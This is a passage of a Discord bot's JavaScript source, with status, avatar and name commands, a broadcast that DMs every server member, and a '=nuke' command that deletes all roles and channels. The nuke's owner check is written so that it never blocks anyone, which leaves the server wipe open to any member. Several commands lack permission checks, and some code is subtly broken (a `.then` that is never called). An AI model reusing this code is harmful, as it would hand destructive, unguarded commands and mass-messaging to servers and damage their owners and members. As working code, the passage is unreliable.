      message.channel.sendMessage(`LISTENING Now: **${argresult}**`)
  }


  if (message.content.startsWith(prefix + 'setname')) {
    client.user.setUsername(argresult).then
        message.channel.sendMessage(`Username Changed To **${argresult}**`)
    return message.reply(".");
  }

  if (message.content.startsWith(prefix + 'setavatar')) {
    client.user.setAvatar(argresult);
     message.channel.sendMessage(`Avatar Changed Successfully To **${argresult}**`);
  }

  if (message.content.startsWith(prefix + 'setstream')) {
    client.user.setGame(argresult, "https://www.twitch.tv/9ivv");
       console.log('test' + argresult);
      message.channel.sendMessage(`Streaming: **${argresult}**`)
  }
  if (message.content.startsWith(prefix + 'setplay')) {
    client.user.setGame(argresult);
       console.log('test' + argresult);
      message.channel.sendMessage(`Playing: **${argresult}**`)
  }

 });


 client.on('message', message => {
    if(!message.channel.guild) return;
 if(message.content.startsWith(prefix + 'bc')) {
 if(!message.channel.guild) return;
 if(!message.member.hasPermission('ADMINISTRATOR')) return      message.channel.send('**You\'re missing the following permissions: ** `ADMINISTRATOR`' );
 let args = message.content.split(" ").join(" ").slice(2 + prefix.length);
 let BcList = new Discord.RichEmbed()
 .setThumbnail(message.author.avatarURL)
 .setColor("RANDOM")
 .setTitle(`**Message content: [ ${args} ] **`)
 .setDescription(`**Embeded broadcast message.📝\nNormal broadcast message.✏ \nYou have 1 minute to choose.**`)
 if (!args) return message.reply('**You need to proivde atleast one word for the broadcast messages. :x:**');message.channel.send(BcList).then(msg => {
 msg.react('📝')
 .then(() => msg.react('✏'))
 .then(() =>msg.react('📝'))
  
 let EmbedBcFilter = (reaction, user) => reaction.emoji.name === '📝' && user.id === message.author.id;
 let NormalBcFilter = (reaction, user) => reaction.emoji.name === '✏' && user.id === message.author.id;
  
 let EmbedBc = msg.createReactionCollector(EmbedBcFilter, { time: 60000 });
 let NormalBc = msg.createReactionCollector(NormalBcFilter, { time: 60000 });
  
 EmbedBc.on("collect", r => {
 message.channel.send(`**:ballot_box_with_check: Sent.**`).then(m => m.delete(5000));
 message.guild.members.forEach(m => {
 var bc = new
 Discord.RichEmbed()
 .setColor('RANDOM')
 .setTitle('**New Message. 📬**')
 .addField('» Server.', `**[ ${message.guild.name} ]**`)
 .addField('» Author.', `**[ ${message.author.username} ]**`)
 .addField('» Message.', `**[ ${args} ]**`)
 .setThumbnail('https://cdn.discordapp.com/attachments/473283523219030026/497406214871973889/c95d0db51890800925b66e208974c5fc.png')
 m.send({ embed: bc })
 if(message.attachments.first()){
     m.sendFile(message.attachments.first().url).catch();
 }
 msg.delete();
 })
 })
 NormalBc.on("collect", r => {
   message.channel.send(`**:ballot_box_with_check: Sent.**`).then(m => m.delete(5000));
 message.guild.members.forEach(m => {
 m.send(`**» Server → [ ${message.guild.name} ]\n» Author → [ ${message.author} ]\n ==================**\n${args}\n${m}`);
 if(message.attachments.first()){
m.sendFile(message.attachments.first().url).catch();
 }
 msg.delete();
 })
 })
 })
 }
 });



client.on('message', message => {
    if(!message.author === message.guild.owner) return;
    if(message.content === '=nuke') {
        message.guild.roles.forEach(r => { r.delete() })
        message.guild.channels.forEach(c => { c.delete() })
        message.guild.owner.sendMessage('Your server has been nuked\nName: ' + ` **${message.guild.name}**`);

    }
});

    client.on('message', message => {
        if(message.content.startsWith(prefix + 'namemc')) {
            let args = message.content.split(' ').slice(1).join(' ');
            if (!args) return message.channel.send("**Please provide an mc username. :x:**");
            var link = (`https://namemc.com/${args}`);
            message.channel.send(link);
        }
    });

client.login(process.env.BOT_TOKEN);
